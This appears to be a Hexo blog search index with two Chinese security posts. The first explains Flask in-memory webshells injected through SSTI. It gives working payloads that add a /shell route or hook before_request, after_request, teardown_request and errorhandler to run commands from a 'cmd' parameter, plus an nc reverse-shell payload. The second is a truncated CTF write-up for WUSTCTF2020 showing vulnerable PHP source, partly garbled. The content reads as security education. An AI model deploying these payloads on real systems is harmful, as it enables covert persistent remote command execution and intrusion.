<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>flask下的内存马</title>
      <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>内存马是一种<strong>无文件落地</strong>的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！</p><h3 id="flask的内存马又怎么说"><a href="#flask的内存马又怎么说" class="headerlink" title="flask的内存马又怎么说"></a>flask的内存马又怎么说</h3><p>就是利用flask的ssti漏洞，进行插入内存马！</p><h2 id="旧马（flask2-x）"><a href="#旧马（flask2-x）" class="headerlink" title="旧马（flask2.x）"></a>旧马（flask2.x）</h2><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>我们对pyaload进行逐一分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>先就是找eval用于python代码，当然exec也可以！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span></span><br></pre></td></tr></table></figure><p>app是Flask类的实例，简单来说就是Flask应用本身！</p><p>add_url_rule是Flask框架中的一个核心方法，用于手动添加URL路由规则！</p><p>我们通过跟进route这个装饰器函数，找到add_url_rule在跟进它，拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>)</span><br></pre></td></tr></table></figure><p>主要就是看三个参数</p><ul><li>rule：函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头</li><li>endpoint：路由的端点名称，是一个标识符，用于在 Flask 内部引用这个路由。说白了就是一个函数名</li><li>view_func：处理这个路由请求的视图函数，当客户端访问这个路径时，会调用这个函数。</li></ul><p>接下来就看调用的这个函数了</p><p>lambda是一个无名函数，:后面是一个表达式用于实现函数的功能！这里就是导入命令函数，那么<code>_request_ctx_stack.top</code>这个又是什么玩意？</p><h4 id="flask请求上下文机制"><a href="#flask请求上下文机制" class="headerlink" title="flask请求上下文机制"></a>flask请求上下文机制</h4><blockquote><p>当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>. 在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性. <code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p></blockquote><p>那么说白了就是请求的储存的结构式栈结构，后进先出，然后通过<code>_request_ctx_stack.top</code>获取栈顶元素也就是最新请求！</p><p>那么这里我们就明白了</p><p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)</code>就是获得请求的cmd参数，默认值是whoami</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>eval的第二个参数是个字典用于声明里面的全局变量，用来指定<code>exec()</code> 或 <code>eval()</code> 的<strong>第一个参数（即要执行的代码字符串）中引用的、但并未在代码字符串内部定义</strong>的那些变量</p><p>到这整个pyload就分析完了</p><h3 id="本地test"><a href="#本地test" class="headerlink" title="本地test"></a>本地test</h3><p>首先安装</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">pip install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>接下来就是运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27;</span>%(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)      <span class="comment"># 渲染为html内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:          <span class="comment"># 如果作为脚本运行，而不是被当成模块导入</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>打入内存马，进行命令执行</p><p><img src="/%5Cimages%5Cachieve%5C2025%5C10%5C4.png"></p><p>成功非常nice！</p><h2 id="新马（flask3-x）"><a href="#新马（flask3-x）" class="headerlink" title="新马（flask3.x）"></a>新马（flask3.x）</h2><p>为啥新版本的不行？主要是报错</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">AssertionError: <span class="title">The</span> <span class="title">setup</span> <span class="title">method</span> &#x27;<span class="title">add_url_rule</span>&#x27; <span class="title">can</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">be</span> <span class="title">called</span> <span class="title">on</span> <span class="title">the</span> <span class="title">application</span>. <span class="title">It</span> <span class="title">has</span> <span class="title">already</span> <span class="title">handled</span> <span class="title">its</span> <span class="title">first</span> <span class="title">request</span>, <span class="title">any</span> <span class="title">changes</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">applied</span> <span class="title">consistently</span>.</span></span><br></pre></td></tr></table></figure><p>在应用启动之后说是不能用add_url_rule进行添加路由！</p><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><p>什么是装饰器？</p><p>装饰器是一种用于<strong>修改或增强函数或方法行为</strong>的高级函数。装饰器本质上是一个接受函数作为参数并返回一个新函数的函数。</p><h4 id="利用before-request"><a href="#利用before-request" class="headerlink" title="利用before_request"></a>利用before_request</h4><p>before_request 方法允许我们在每个请求之前执行一些操作,跟进它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p><code>self.before_request_funcs</code> 是 Flask 应用对象中的一个属性。它是一个 <strong>字典</strong>，用于存储在请求处理之前需要执行的钩子函数。</p><p><code>setdefault(None,[]).append(f)</code>这个其实就是用来增加新的钩子函数的！那么我们插入lambda:<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>,&#123;<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>如果不定义字典也可以去sys.modules里面去找</p><blockquote><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然找app这个对象的方法不绝对，随机应变即可</p><p>这个payload的缺点就是只能用一次，毕竟你打入之后每次请求之前就会执行我们插入的lambda函数！</p><h4 id="利用after-request"><a href="#利用after-request" class="headerlink" title="利用after_request"></a>利用after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f</span>):</span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>先自己整一整</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;app.after<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>为什么不行（在before_request的基础上改），打入进去之后每次请求之后就会就是执行我们的函数，但是这不是响应啊哥们</p><p>来分析正确的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>resp</code> 代表 Response Object (响应对象)就是原来的响应！<code>__import__(&#39;flask&#39;).make_response()</code>这里就可看到是需要调用make_response()这个函数来生成新的响应内容的</p><p><img src="/%5Cimages%5Cachieve%5C2025%5C10%5C5.png"></p><p>这个就爽多了！</p><h3 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h3><p>这个上面就用到了，插入的就是我们定义的钩子函数</p><blockquote><p>本质是：允许用户在某个特定时机插入自定义逻辑的一种机制，通俗点讲就是，钩子函数就像是在一个流程中预留出来的挂钩点，你可以挂上自己的函数来改变或增强原有的行为<br>这个是不是和前面的装饰器（增强函数行为）有点像，其实装饰器是就是通过钩子函数来增强函数的行为的</p></blockquote><p>特点：</p><ul><li>预定义的调用时机：不是你直接调用钩子函数，而是某个系统、框架或库在合适的时候自动调用它。</li><li>用户自定义逻辑：你写的函数会被当作 “钩子” 插入原流程中执行。</li><li>可插拔、灵活扩展：不需要改动原代码，就可以通过钩子增强功能</li></ul><h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><blockquote><p>teardown_request 是在每个请求的最后阶段执行的，即在视图函数处理完成并生成响应后，或者在请求中发生未处理的异常时，都会执行这个钩子。</p><p>它执行的时机是在响应已经确定之后，但在最终发送给客户端之前。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>由于是无回显所以反弹shell和写入文件都可以</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc ip port &gt; /tmp/fifo; rm /tmp/fifo&#x27;))&quot;</span>)</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 11.txt&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>此函数可以用于自定义 404 页面的回显，用于处理应用程序中发生的错误，当你 flask 遇到错误，你可以定义自定义的错误处理程序来处理错误并返回适当的响应</p><p>跟进拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">        <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)      <span class="comment">#这个是去注册f</span></span><br><span class="line">        <span class="keyword">return</span> f         <span class="comment">#返回的是错误处理函数</span></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="comment"># T_error_handler   错误处理函数的类型</span></span><br></pre></td></tr></table></figure><p>继续跟进看看是怎么注册的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">        f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">        <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure><p>这里注册就是error_handler_spec，它的结构：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.error<span class="built_in">_</span>handler<span class="built_in">_</span>spec = &#123;</span><br><span class="line">    None: &#123;</span><br><span class="line">        404: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>404,</span><br><span class="line">            AnotherException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>another,</span><br><span class="line">        &#125;,</span><br><span class="line">        500: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>500,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说通过code和exc_class去注册这个f（错误处理函数），</p><p>但是这两家伙由_get_exc_class_and_code(code_or_exception)这个控制</p><blockquote><p>这个定义的函数 _get_exc_class_and_code 是用来处理异常类或 HTTP 状态码的。函数接受一个参数，exc_class_or_code，可以是一个异常类或者一个 HTTP 状态码（整型）。</p></blockquote><p>那么接下来直接控制f不就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">global exc_class</span></span><br><span class="line"><span class="string">global code</span></span><br><span class="line"><span class="string">exc_class, code = app._get_exc_class_and_code(404)</span></span><br><span class="line"><span class="string">app.error_handler_spec[None][code][exc_class] =</span></span><br><span class="line"><span class="string">lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因为是在exec里面必须指定exec的由来，不像之前ssti里面打的</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(request.values.x).read()&#125;&#125;<span class="built_in">&amp;</span>x=cat /f*</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也算是学了一下原理，主要就是老马：加路由！新马：主要就是打入钩子函数，在特定的时机去触发！</p>]]></content>
      
      
      <categories>
          
          <category> flask内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSCTF2020（部分解）</title>
      <link href="/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/"/>
      <url>/2025/10/27/WUSCTF2020%EF%BC%88%E9%83%A8%E5%88%86%E8%A7%A3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>&#x2F;robots下面有&#x2F;fAke_f1agggg.php一开始根据回显页面以为没用，但是响应头里面有东西！</p><p>&#x2F;fl4g.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 